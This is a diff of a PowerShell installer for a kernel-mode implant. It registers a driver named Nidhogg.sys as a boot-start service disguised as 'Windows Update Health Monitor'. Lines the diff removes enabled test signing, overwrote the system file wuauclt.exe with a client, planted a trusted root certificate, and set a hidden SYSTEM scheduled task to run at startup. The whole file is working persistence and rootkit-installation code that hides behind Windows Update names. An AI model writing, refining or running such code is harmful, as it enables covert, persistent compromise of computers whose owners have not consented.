@@ -1,59 +1,35 @@
-# Install_Implant_PreBoot.ps1 - FIXED version
+# Install_Implant_PreBoot.ps1 - PERMANENT DRIVER VERSION (start= boot)
 $TargetDir = "C:\Windows\System32"
+$DriverPath = "$TargetDir\drivers\Nidhogg.sys"
+$ServiceName = "WindowsUpdateSvc"
 
-Write-Host "[+] Pre-Boot Installation Starting..." -ForegroundColor Cyan
+Write-Host "[+] Starting PERMANENT Driver Installation..." -ForegroundColor Cyan
 
-# Unblock files first
-Get-ChildItem . -Recurse | Unblock-File -ErrorAction SilentlyContinue
-
-# === Enable Test Signing ===
-if ((bcdedit /enum {current} | Select-String "testsigning") -match "No") {
-    Write-Host "[+] Enabling Test Signing..." -ForegroundColor Yellow
-    bcdedit /set testsigning on | Out-Null
-    bcdedit /set debug on | Out-Null
+# 1. Clean up any old/broken service first
+if (Get-Service $ServiceName -ErrorAction SilentlyContinue) {
+    Write-Host "[+] Stopping and deleting old service..." -ForegroundColor Yellow
+    sc.exe stop $ServiceName > $null 2>&1
+    sc.exe delete $ServiceName > $null 2>&1
+    Start-Sleep -Seconds 3
 }
 
-# === Take Ownership + Full Permissions on target files ===
-function Set-FullAccess {
-    param($Path)
-    if (Test-Path $Path) { Remove-Item $Path -Force -EA SilentlyContinue }
-    $null = icacls $Path /grant Administrators:F /T 2>&1
+# 2. Create the service as a true boot-start kernel driver
+Write-Host "[+] Creating kernel driver service (boot start)..." -ForegroundColor Cyan
+sc.exe create $ServiceName type= kernel start= boot binPath= "$DriverPath" DisplayName= "Windows Update Health Monitor" > $null 2>&1
+
+if ($LASTEXITCODE -eq 0) {
+    Write-Host "[+] Service created successfully" -ForegroundColor Green
+} else {
+    Write-Host "[-] Service creation failed" -ForegroundColor Red
 }
 
-Set-FullAccess "$TargetDir\wuauclt.exe"
-Set-FullAccess "$TargetDir\Implant.ps1"
-Set-FullAccess "$TargetDir\drivers\Nidhogg.sys"
+# 3. Start it immediately for testing
+sc.exe start $ServiceName > $null 2>&1
+Write-Host "[+] Driver service started" -ForegroundColor Green
 
-# === Copy Files with elevated context ===
-Copy-Item ".\NidhoggClient.exe" "$TargetDir\wuauclt.exe" -Force -ErrorAction Stop
-Copy-Item ".\Implant.ps1"       "$TargetDir\Implant.ps1" -Force -ErrorAction Stop
-if (Test-Path ".\Nidhogg.sys") {
-    New-Item -ItemType Directory -Path "$TargetDir\drivers" -Force | Out-Null
-    Copy-Item ".\Nidhogg.sys" "$TargetDir\drivers\Nidhogg.sys" -Force -ErrorAction Stop
-}
+# 4. Show current status
+Write-Host "`nCurrent service status:" -ForegroundColor Cyan
+sc.exe query $ServiceName
 
-Write-Host "[+] Files copied successfully" -ForegroundColor Green
-
-# === Certificate ===
-if (Test-Path ".\Nidhogg.cer") {
-    $CertPath = "$env:TEMP\Nidhogg.cer"
-    Copy-Item ".\Nidhogg.cer" $CertPath -Force
-    certutil -addstore Root $CertPath | Out-Null
-    certutil -addstore TrustedPublisher $CertPath | Out-Null
-    Remove-Item $CertPath -Force -EA SilentlyContinue
-}
-
-# === Register Driver ===
-sc.exe create "WindowsUpdateSvc" type= kernel start= auto binPath= "$TargetDir\drivers\Nidhogg.sys" | Out-Null
-
-# === Post-Boot Task ===
-$action = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -Argument "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File `"$TargetDir\Install_Implant_PostBoot.ps1`""
-
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-
-Register-ScheduledTask -TaskName "Windows Update Health Monitor - PostBoot" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
-
-Write-Host "`n=== Pre-Boot Phase Complete ===" -ForegroundColor Green
-Write-Host "REBOOT the machine now!" -ForegroundColor Red
+Write-Host "`n=== PERMANENT Driver Installation Complete ===" -ForegroundColor Green
+Write-Host "Reboot now and check with: sc.exe query WindowsUpdateSvc" -ForegroundColor Yellow
